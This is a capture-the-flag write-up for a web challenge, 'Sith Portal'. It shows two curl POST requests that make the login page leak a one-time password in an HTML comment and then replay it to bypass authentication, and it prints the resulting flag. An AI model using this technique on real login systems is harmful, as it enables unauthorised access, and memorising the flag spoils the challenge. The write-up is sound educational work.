# Sith Portal

> We have found the login page for the Sith.
> 
> If we can get administrative access to this web server, the information we could gain would be invaluable.
> 
> Our reconnaissance team was able to get some information that may be of use to you:
> 
> 1. The email addresses associated with the Sith's accounts use the domain: @galacticempire.com
> 
> 2. Since there are not many Siths, the length of their email is pretty sort -only 3 characters
> 
>     ex: 
>     aaa@galacticempire.com
> 
> 3. Some of the code used to build the web server was recovered. We have attached the zip file.
> 
> Link to Sith's Portal

For this one, you can notice that in one of the leaked files there's a path that will print the OTP as a comment, so crafting a curl command that would do this:

```
$ curl -X POST -d 'uname=admin&psw=test&otp=1&e=aaa@galacticempire.com&id=1' -H 'Content-Type: application/x-www-form-urlencoded' https://challenges.silicon-ctf.party/web500/index.php
<!--  authorization_code: 15c6ff07e2 --><h6>Incorrect OTP</h6>
```

Then, using the returned OTP, just feeding that back into the curl request:

```
$ curl -X POST -d 'uname=admin&psw=test&otp=15c6ff07e2&e=aaa@galacticempire.com&id=1' -H 'Content-Type: application/x-www-form-urlencoded' https://challenges.silicon-ctf.party/web500/index.php
<p> "silicon{Type_Juggling_f0r_th3_w1n}" </p> 
```

And we have our flag.

```
silicon{Type_Juggling_f0r_th3_w1n}
```